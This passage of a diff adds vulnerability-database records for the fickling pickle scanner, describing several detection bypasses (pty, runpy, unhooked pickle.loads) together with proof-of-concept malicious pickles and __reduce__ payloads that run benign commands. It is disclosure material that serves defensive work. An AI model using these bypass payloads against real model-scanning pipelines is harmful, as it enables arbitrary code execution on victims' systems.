+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-r48f-3986-4f9c"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/7f39d97258217ee2c21a1f5031d4a6d7343eb30d"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.10"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-r48f-3986-4f9c",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.10"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8",
+        "0.1.9"
+      ]
+    },
+    {
+      "id": "GHSA-r7v6-mfhq-g3m2",
+      "primary_id": "CVE-2025-67748",
+      "aliases": [
+        "CVE-2025-67748"
+      ],
+      "cve_ids": [
+        "CVE-2025-67748"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has Code Injection vulnerability via pty.spawn()",
+      "details": "## Fickling Assessment\n\nBased on the test case provided in the original report below, this bypass was caused by `pty` missing from our block list of unsafe module imports (as previously documented in #108), rather than the unused variable heuristic. This led to unsafe pickles based on `pty.spawn()` being incorrectly flagged as `LIKELY_SAFE`, and was fixed in https://github.com/trailofbits/fickling/pull/187. \n\n## Original report\n\n### Summary\nAn unsafe deserialization vulnerability in Fickling allows a crafted pickle file to bypass the \"unused variable\" heuristic, enabling arbitrary code execution. This bypass is achieved by adding a trivial operation to the pickle file that \"uses\" the otherwise unused variable left on the stack after a malicious operation, tricking the detection mechanism into classifying the file as safe.\n\n### Details\nFickling relies on the heuristic of detecting unused variables in the VM's stack after execution. Opcodes like `REDUCE`, `OBJ`, and `INST`, which can be used for arbitrary code execution, leave a value on the stack that is often unused in malicious pickle files.\nThis vulnerability enables a bypass by modifying the pickle file to use this leftover variable. A simple way to achieve this is to add a `BUILD` opcode that, in effect, adds a `__setstate__` to the unused variable. This makes Fickling consider the variable \"used,\" thus failing to flag the malicious file.\n\n### PoC\nThe following is a disassembled view of a malicious pickle file that bypasses Fickling's \"unused variable\" detection:\n```\n    0: \\x80 PROTO      4\n    2: \\x95 FRAME      26\n   11: \\x8c SHORT_BINUNICODE 'pty'\n   16: \\x94 MEMOIZE    (as 0)\n   17: \\x8c SHORT_BINUNICODE 'spawn'\n   24: \\x94 MEMOIZE    (as 1)\n   25: \\x93 STACK_GLOBAL\n   26: \\x94 MEMOIZE    (as 2)\n   27: \\x8c SHORT_BINUNICODE 'id'\n   31: \\x94 MEMOIZE    (as 3)\n   32: \\x85 TUPLE1\n   33: \\x94 MEMOIZE    (as 4)\n   34: R   REDUCE\n   35: \\x94 MEMOIZE    (as 5)\n   36: \\x8c SHORT_BINUNICODE 'gottem'\n   44: \\x94 MEMOIZE    (as 6)\n   45: b   BUILD\n   46: .   STOP\n ```\n \nHere, the additions to the original pickle file can see on lines 35, 36, 44 and 45.\n\nWhen analyzing this modified file, Fickling fails to identify it as malicious and reports it as **\"LIKELY_SAFE\"** as seen here:\n```\n{\n    \"severity\": \"LIKELY_SAFE\",\n    \"analysis\": \"Warning: Fickling failed to detect any overtly unsafe code,but the pickle file may still be unsafe.Do not unpickle this file if it is from an untrusted source!\\n\\n\",\n    \"detailed_results\": {}\n}\n```\n\n### Impact\nThis allows an attacker to craft a malicious pickle file that can bypass fickling since it relies on the \"unused variable\" heuristic to flag pickle files as unsafe. A user who deserializes such a file, believing it to be safe, would inadvertently execute arbitrary code on their system. This impacts any user or system that uses Fickling to vet pickle files for security issues.",
+      "published": "2025-12-15T23:37:28Z",
+      "modified": "2025-12-20T02:53:24.461472Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-r7v6-mfhq-g3m2"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-67748"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/108"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/187"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-r7v6-mfhq-g3m2",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5"
+      ]
+    },
+    {
+      "id": "GHSA-wccx-j62j-r448",
+      "primary_id": "GHSA-wccx-j62j-r448",
+      "aliases": [],
+      "cve_ids": [],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has `always_check_safety()` bypass: pickle.loads and _pickle.loads remain unhooked",
+      "details": "# Assessment\n\nThe missing pickle entrypoints `pickle.loads`, `_pickle.loads`, and `_pickle.load` were added to the hook https://github.com/trailofbits/fickling/commit/8c24c6edabceab156cfd41f4d70b650e1cdad1f7.\n\n# Original report\n\n## Summary\n`fickling.always_check_safety()` does not hook all pickle entry points. `pickle.loads`, `_pickle.loads`, and `_pickle.load` remain unprotected, enabling malicious payload execution despite global safety mode being enabled.\n\n## Affected versions\n`<= 0.1.8` (verified on current upstream HEAD as of 2026-03-03)\n\n## Non-duplication check against published Fickling GHSAs\nNo published advisory covers hook-coverage bypass in `run_hook()`.\nExisting advisories are blocklist/detection bypasses (runpy, pty, cProfile, marshal/types, builtins, network constructors, OBJ visibility, etc.), not runtime hook coverage parity.\n\n## Root cause\n`run_hook()` patches only:\n- `pickle.load`\n- `pickle.Unpickler`\n- `_pickle.Unpickler`\n\nIt does not patch:\n- `pickle.loads`\n- `_pickle.load`\n- `_pickle.loads`\n\n## Reproduction (clean upstream)\n```python\nimport io, pickle, _pickle\nfrom unittest.mock import patch\nimport fickling\nfrom fickling.exception import UnsafeFileError\n\nclass Payload:\n    def __reduce__(self):\n        import subprocess\n        return (subprocess.Popen, (['echo','BYPASS'],))\n\ndata = pickle.dumps(Payload())\nfickling.always_check_safety()\n\n# Bypass path\nwith patch('subprocess.Popen') as popen_mock:\n    pickle.loads(data)\n    print('bypass sink called?', popen_mock.called)  # True\n\n# Control path is blocked\nwith patch('subprocess.Popen') as popen_mock:\n    try:\n        pickle.load(io.BytesIO(data))\n    except UnsafeFileError:\n        pass\n    print('blocked sink called?', popen_mock.called)  # False\n```\n\nObserved on vulnerable code:\n- `pickle.loads` executes payload\n- `pickle.load` is blocked\n\n## Minimal patch diff\n```diff\n--- a/fickling/hook.py\n+++ b/fickling/hook.py\n@@\n def run_hook():\n-    pickle.load = loader.load\n+    pickle.load = loader.load\n+    _pickle.load = loader.load\n+    pickle.loads = loader.loads\n+    _pickle.loads = loader.loads\n```\n\n## Validation after patch\n- `pickle.loads`, `_pickle.loads`, and `_pickle.load` all raise `UnsafeFileError`\n- sink not called in any path\n\nRegression tests added locally:\n- `test_run_hook_blocks_pickle_loads`\n- `test_run_hook_blocks__pickle_load_and_loads`\n  in `test/test_security_regressions_20260303.py`\n\n## Impact\nHigh-confidence runtime protection bypass for applications that trust `always_check_safety()` as global guard.",
+      "published": "2026-03-04T21:30:16Z",
+      "modified": "2026-03-04T21:49:54.338830Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-wccx-j62j-r448"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/8c24c6edabceab156cfd41f4d70b650e1cdad1f7"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.9"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-wccx-j62j-r448",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.9"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6",
+        "0.1.7",
+        "0.1.8"
+      ]
+    },
+    {
+      "id": "GHSA-wfq2-52f7-7qvj",
+      "primary_id": "CVE-2026-22606",
+      "aliases": [
+        "CVE-2026-22606"
+      ],
+      "cve_ids": [
+        "CVE-2026-22606"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fickling",
+      "summary": "Fickling has a bypass via runpy.run_path() and runpy.run_module()",
+      "details": "# Fickling's assessment\n\n`runpy`  was added to the list of unsafe imports (https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66).\n\n# Original report\n\n### Summary\nFickling versions up to and including 0.1.6 do not treat Python\u2019s runpy module as unsafe. Because of this, a malicious pickle that uses runpy.run_path() or runpy.run_module() is classified as SUSPICIOUS instead of OVERTLY_MALICIOUS.\n\nIf a user relies on Fickling\u2019s output to decide whether a pickle is safe to deserialize, this misclassification can lead them to execute attacker-controlled code on their system.\n\nThis affects any workflow or product that uses Fickling as a security gate for pickle deserialization.\n\n### Details\nThe `runpy` module is missing from fickling's block list of unsafe module imports in `fickling/analysis.py`. This is the same root cause as CVE-2025-67748 (pty) and CVE-2025-67747 (marshal/types).\n\nIncriminated source code:\n- File: `fickling/analysis.py`\n- Class: `UnsafeImports`\n- Issue: The blocklist does not include `runpy`, `runpy.run_path`, `runpy.run_module`, or `runpy._run_code`\n\nReference to similar fix:\n- PR #187 added `pty` to the blocklist to fix CVE-2025-67748\n- PR #108 documented the blocklist approach\n- The same fix pattern should be applied for `runpy`\n\nHow the bypass works:\n1. Attacker creates a pickle using `runpy.run_path()` in `__reduce__`\n2. Fickling's `UnsafeImports` analysis does not flag `runpy` as dangerous\n3. Only the `UnusedVariables` heuristic triggers, resulting in `SUSPICIOUS` severity\n4. The pickle should be rated `OVERTLY_MALICIOUS` like `os.system`, `eval`, and `exec`\n\nTested behavior (fickling 0.1.6):\n\n| Function          | Fickling Severity          | RCE Capable |\n|-------------------|----------------------------|-------------|\n| os.system         | LIKELY_OVERTLY_MALICIOUS   | Yes         |\n| eval              | OVERTLY_MALICIOUS          | Yes         |\n| exec              | OVERTLY_MALICIOUS          | Yes         |\n| runpy.run_path    | SUSPICIOUS                 | Yes \u2190 BYPASS |\n| runpy.run_module  | SUSPICIOUS                 | Yes \u2190 BYPASS |\n\nSuggested fix:\nAdd to the unsafe imports blocklist in `fickling/analysis.py`:\n- runpy\n- runpy.run_path\n- runpy.run_module\n- runpy._run_code\n- runpy._run_module_code\n\n### PoC\n_Complete instructions, including specific configuration details, to reproduce the vulnerability._**Environment:**\n- Python 3.13.2\n- fickling 0.1.6 (latest version, installed via pip)\n\nStep 1: Create malicious pickle\n\nimport pickle\nimport runpy\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        return (runpy.run_path, (\"/tmp/malicious_script.py\",))\n\nwith open(\"malicious.pkl\", \"wb\") as f:\n    pickle.dump(MaliciousPayload(), f)\n\nStep 2: Create the malicious script that will be executed\n\necho 'print(\"RCE ACHIEVED\"); open(\"/tmp/pwned\",\"w\").write(\"compromised\")' > /tmp/malicious_script.py\n\nStep 3: Analyze with fickling\n\nfickling --check-safety malicious.pkl\n\nExpected output (if properly detected):\nSeverity: OVERTLY_MALICIOUS\n\nActual output (bypass confirmed):\n{\n    \"severity\": \"SUSPICIOUS\",\n    \"analysis\": \"Variable `_var0` is assigned value `run_path(...)` but unused afterward; this is suspicious and indicative of a malicious pickle file\",\n    \"detailed_results\": {\n        \"AnalysisResult\": {\n            \"UnusedVariables\": [\"_var0\", \"run_path(...)\"]\n        }\n    }\n}\n\nStep 4: Prove RCE by loading the pickle\n\nimport pickle\npickle.load(open(\"malicious.pkl\", \"rb\"))\n# Check: ls /tmp/pwned  <-- file exists, proving code execution\n\nPickle disassembly (evidence):\n\n    0: \\x80 PROTO      4\n    2: \\x95 FRAME      92\n   11: \\x8c SHORT_BINUNICODE 'runpy'\n   18: \\x94 MEMOIZE    (as 0)\n   19: \\x8c SHORT_BINUNICODE 'run_path'\n   29: \\x94 MEMOIZE    (as 1)\n   30: \\x93 STACK_GLOBAL\n   31: \\x94 MEMOIZE    (as 2)\n   32: \\x8c SHORT_BINUNICODE '/tmp/malicious_script.py'\n   ...\n  100: R    REDUCE\n  101: \\x94 MEMOIZE    (as 5)\n  102: .    STOP\n  \n### Impact\n\nVulnerability Type:\nIncomplete blocklist leading to safety check bypass (CWE-184) and arbitrary code execution via insecure deserialization (CWE-502).\n\nWho is impacted:\nAny user or system that relies on fickling to vet pickle files for security issues before loading them. This includes:\n\nAttack scenario:\nAn attacker uploads a malicious ML model or pickle file to a model repository. The victim's pipeline uses fickling to scan uploads. Fickling rates the file as \"SUSPICIOUS\" (not \"OVERTLY_MALICIOUS\"), so the file is not rejected. When the victim loads the model, arbitrary code executes on their system.\n\nSeverity: HIGH\n- The attacker achieves arbitrary code execution\n- The security control (fickling) is specifically designed to prevent this\n- The bypass requires no special conditions beyond crafting the pickle with `runpy`",
+      "published": "2026-01-09T20:52:40Z",
+      "modified": "2026-02-03T03:15:12.348746Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-565g-hwwr-4pp3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-r7v6-mfhq-g3m2"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/security/advisories/GHSA-wfq2-52f7-7qvj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-22606"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/108"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/187"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/pull/195"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/commit/9a2b3f89bd0598b528d62c10a64c1986fcb09f66"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/trailofbits/fickling"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/blob/977b0769c13537cd96549c12bb537f05464cf09c/test/test_bypasses.py#L87"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/trailofbits/fickling/releases/tag/v0.1.7"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-wfq2-52f7-7qvj",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.1.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.0.1",
+        "0.0.2",
+        "0.0.3",
+        "0.0.4",
+        "0.0.5",
+        "0.0.6",
+        "0.0.7",
+        "0.0.8",
+        "0.1.2",
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ],
+      "affected_conda_versions": [
+        "0.1.3",
+        "0.1.4",
+        "0.1.5",
+        "0.1.6"
+      ]
+    }
+  ]
+}
